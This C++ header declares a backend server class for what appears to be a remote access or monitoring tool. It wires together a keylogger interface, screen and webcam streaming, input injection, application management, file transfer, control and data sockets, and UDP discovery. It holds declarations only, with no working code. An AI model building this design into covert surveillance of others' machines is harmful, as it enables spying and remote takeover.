#pragma once
#include <memory>
#include <thread>
#include <atomic>
#include <vector>
#include <unordered_map>
#include <mutex>
#include "core/BroadcastBus.hpp"
#include "core/StreamSession.hpp"
#include "interfaces/IKeylogger.hpp"
#include "interfaces/IAppManager.hpp"
#include "interfaces/IInputInjector.hpp"
#include "interfaces/IFileTransfer.hpp"
#include "core/CommandDispatcher.hpp"
#include "core/ThreadPool.hpp"

#include "core/NetworkDefs.hpp"

namespace core {

    class BackendServer {
    public:
        BackendServer(
            uint16_t port,
            std::shared_ptr<BroadcastBus> bus_monitor,
            std::shared_ptr<BroadcastBus> bus_webcam,
            std::shared_ptr<StreamSession> session,
            std::shared_ptr<StreamSession> webcam_session,
            std::shared_ptr<interfaces::IKeylogger> keylogger,
            std::shared_ptr<interfaces::IAppManager> app_manager,
            std::shared_ptr<interfaces::IInputInjector> input_injector,
            std::shared_ptr<interfaces::IFileTransfer> file_transfer
        );
        ~BackendServer();

        // Blocking call (runs the connection loop)
        void run();

        // Signals stop
        void stop();

    private:
        void handle_connection(socket_t fd_control, socket_t fd_data);
        void broadcast_discovery(); // UDP Discovery broadcaster

        // Protocol Helpers
        // Legacy helpers removed

    private:
        static constexpr int DATA_PORT_OFFSET = 1; // Data port = Control port + 1

        uint16_t gateway_port_;         // Control port to listen on
        socket_t listen_fd_{INVALID_SOCKET};       // Control channel
        socket_t listen_fd_data_{INVALID_SOCKET};  // Data channel
        std::thread discovery_thread_;
        std::atomic<bool> running_{false};
        std::shared_ptr<BroadcastBus> bus_monitor_;
        std::shared_ptr<BroadcastBus> bus_webcam_;
        std::shared_ptr<StreamSession> session_;
        std::shared_ptr<StreamSession> webcam_session_;
        std::shared_ptr<interfaces::IKeylogger> keylogger_;
        std::shared_ptr<interfaces::IAppManager> app_manager_;
        std::shared_ptr<interfaces::IInputInjector> input_injector_;
        std::shared_ptr<interfaces::IFileTransfer> file_transfer_;
        std::unique_ptr<command::CommandDispatcher> dispatcher_;
        std::unique_ptr<ThreadPool> command_pool_; // Async command execution
    };

} // namespace core
